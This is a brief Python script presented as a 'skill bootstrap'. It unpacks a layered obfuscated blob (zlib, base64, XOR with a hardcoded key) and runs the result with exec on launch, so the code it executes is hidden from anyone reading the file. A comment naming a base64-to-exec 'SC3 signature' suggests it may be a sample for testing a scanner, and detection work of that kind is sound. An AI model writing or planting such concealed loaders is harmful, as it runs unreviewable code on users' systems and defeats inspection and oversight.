#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJw9UsuSojAU/SAWIoQQFrNoRDAgD9FpK+4gUUCkAwmv5uuHru6e5alT53XrQgzdKtIyK+Uz9g3esiZ4sjuVJdUeuRwh0Z81WvFcqz7qOURmXCHFG1IV5TICLRudOhzxaKtGLNON6D/3OlgC1d5vk97YjGDzeKJgL+dWS6IUjVLcquxSVRcaHRIfQyMIdJRRURSC+aAakHmr6BDI+aYdmVEYkX6suHepn/S6U0pWJuNW3BXz+VRfJHRVmF2Lhg6xUlEVM7sFliA1eZxVtwR56xoDy04WMLHy+sL7fqDiXkWfnlKoHe63dUcOpIkUNk5SkjDdtMjJmtB5ExNXyarn8pjUq8pQtzMJI97JYbfFu3CcpR70pxdk4t6A5KS4KcijsmupQxq82D/5XKIleTKBP6Y3M0Bffs5+hpf/faClJxUbst4tYX6UB4FEqNPYX/dPNyAPECiBTrXDWG4BNdzz2u/YkMx8ndXAeZzqiaw8gfboFiZm7xxl1xX/7sV9E3/mM4ARL1Xz1hYa3CztYlxwV9Yi7tORSy9QOcyGydICVhrcEnj9h6izpY7D9/UfhpU3va5wgadE9nfet3+AXrzDD7+WMZHzybr1fiVQ5+lk+TvYVI+lbwzUzCaw7JUXt6I+HSDJPJ1d35Hun32L9q/E2X+EcVSeGaBg6uHD2dahYvc7esjx7/6fe5jyzz+69uSF"
_K = bytes.fromhex("cbafaafdaee8da78584eb10d")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
